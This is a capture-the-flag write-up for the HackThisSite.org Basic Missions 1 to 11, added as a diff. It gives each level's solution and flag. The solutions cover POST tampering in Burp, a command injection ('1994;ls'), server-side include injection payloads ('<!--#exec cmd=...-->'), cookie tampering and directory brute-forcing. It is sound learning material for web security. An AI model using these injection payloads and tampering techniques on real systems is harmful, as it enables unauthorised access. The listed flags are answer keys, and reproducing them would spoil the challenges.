@@ -1,0 +1,154 @@
+Hackthissite.org Writeups - Basic Missions
+
+---
+Level 1
+View Page Source > 	Line 145 of Source Code : <!-- the first few levels are extremely easy: password is 1040d3b9 -->
+
+---
+Level 2 
+
+	Network Security Sam set up a password protection script. He made it load the real password from an unencrypted text file and compare it to the password the user enters. However, he neglected to upload the password file...
+
+*However, he neglected to upload the password file...* > There is no check for passwords, so simply just pressing the submit button gives a win!
+
+---
+Level 3
+
+	This time Network Security Sam remembered to upload the password file, but there were deeper problems than that.
+
+Inspect Element > Password Field > "<input name="file" value="password.php" type="hidden">" > https://www.hackthissite.org/missions/basic/3/password.php > flag is : bbf19acd
+
+---
+Level 4
+
+	This time Sam hardcoded the password into the script. However, the password is long and complex, and Sam is often forgetful. So he wrote a script that would email his password to him automatically in case he forgot. Here is the script: Send Password to Sam
+
+We must use a proxy like Burp to intercept and change the POST request:
+
+	POST /missions/basic/4/level4.php HTTP/1.1
+	Host: www.hackthissite.org
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Referer: https://www.hackthissite.org/missions/basic/4/
+	Cookie: PHPSESSID=4fgl29rf46u2ibre9c4tsk8ao7
+	Connection: close
+	Upgrade-Insecure-Requests: 1
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 25
+
+	to=sam%40hackthissite.org >>>>>> to=svarsani%40our.ecu.edu.au
+
+The Password gets emailed to us! :  "b0f4c0f9"
+
+---
+Level 5
+
+	Sam has gotten wise to all the people who wrote their own forms to get the password. Rather than actually learn the password, he decided to make his email program a little more secure.
+
+Similarly to level 4, We must use a proxy like Burp to intercept and change the POST request:
+
+	POST /missions/basic/5/level5.php HTTP/1.1
+	Host: www.hackthissite.org
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Referer: https://www.hackthissite.org/missions/basic/5/
+	Cookie: PHPSESSID=4fgl29rf46u2ibre9c4tsk8ao7
+	Connection: close
+	Upgrade-Insecure-Requests: 1
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 25
+
+	to=sam%40hackthissite.org >>>>> to=svarsani%40our.ecu.edu.au
+
+The Password gets emailed to us! :  "0b2f2c89"
+
+---
+Level 6
+
+	Network Security Sam has encrypted his password. The encryption system is publically available and can be accessed with this form
+
+	Python script:
+
+		encrypted = "4e;36k>m"
+		decrypted = []
+
+		for i in encrypted:
+			decrypted += chr(ord(i))
+
+		for x in range(8):
+			decrypted[x] = chr(ord(decrypted[x]) - x)
+
+		print ''.join(decrypted)
+
+flag = 4d902f8f
+
+---
+Level 7
+
+	This time Network Security sam has saved the unencrypted level7 password in an obscurely named file saved in this very directory.
+
+	In other unrelated news, Sam has set up a script that returns the output from the UNIX cal command. 
+
+	Enter the year you wish to view and hit 'view'.
+
+Entered in 1994;ls > found k1kh31b1n55h.php > https://www.hackthissite.org/missions/basic/7/k1kh31b1n55h.php 
+
+flag = 04fdabd4
+
+---
+Level 8
+	Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/
+
+	However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. She recently learned about saving files, and she wrote a script to demonstrate her ability.
+
+Server-Side Includes Injection
+
+<!--#exec cmd="ls ../" --> > Hi, au12ha39vc.php index.php level8.php tmp! > https://www.hackthissite.org/missions/basic/8/au12ha39vc.php 
+
+Flag : 3dd385c7
+
+--- 
+Level 9
+	Network Security Sam is going down with the ship - he's determined to keep obscuring the password file, no matter how many times people manage to recover it. This time the file is saved in /var/www/hackthissite.org/html/missions/basic/9/.
+
+	In the last level, however, in my attempt to limit people to using server side includes to display the directory listing to level 8 only, I have mistakenly screwed up somewhere.. there is a way to get the obscured level 9 password. See if you can figure out how...
+
+	This level seems a lot trickier then it actually is, and it helps to have an understanding of how the script validates the user's input. The script finds the first occurance of '<--', and looks to see what follows directly after it. 
+
+
+Back to level 8 > <!--#exec cmd="ls ../../9" --> > This climbs up 2 directories and displays the content of /9 > p91e283zc3.php > https://www.hackthissite.org/missions/basic/9/p91e283zc3.php 
+
+Flag: 696be14d
+
+---
+Level 10
+	This time Sam used a more temporary and "hidden" approach to authenticating users, but he didn't think about whether or not those users knew their way around javascript...
+	Please enter a password to gain access to level 10
+
+
+Change a cookie in burp from Cookie: level10_authorized=no; to Cookie: level10_authorized=yes;
+
+---
+Level 11
+	Sam decided to make a music site. Unfortunately he does not understand Apache. This mission is a bit harder than the other basics.
+
+	Use recursebuster to spider "https://www.hackthissite.org/missions/basic/11/"
+	`recursebuster -u https://www.hackthissite.org/missions/basic/11 -w /usr/share/wordlists/dirb/small.txt -t 20 -nospider -noget`
+	That gives us https://www.hackthissite.org/missions/basic/11/e/ > from here we can traverse to https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/ > Seems like an empty directory
+
+	https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/.htaccess > reveals the hidden files on apache (shown below)?
+		`IndexIgnore DaAnswer.* .htaccess
+		<Files .htaccess>
+		order allow,deny
+		allow from all
+		</Files>`
+
+	https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer > give us "The answer is right here! Just look a little harder."	> answer being "right here"
+
+	https://www.hackthissite.org/missions/basic/11/index.php > Password form > Use "right here as password" > Takes us to "go on" button which marks completion of the level!
+
+	---
+	End of Basic Missions!
+
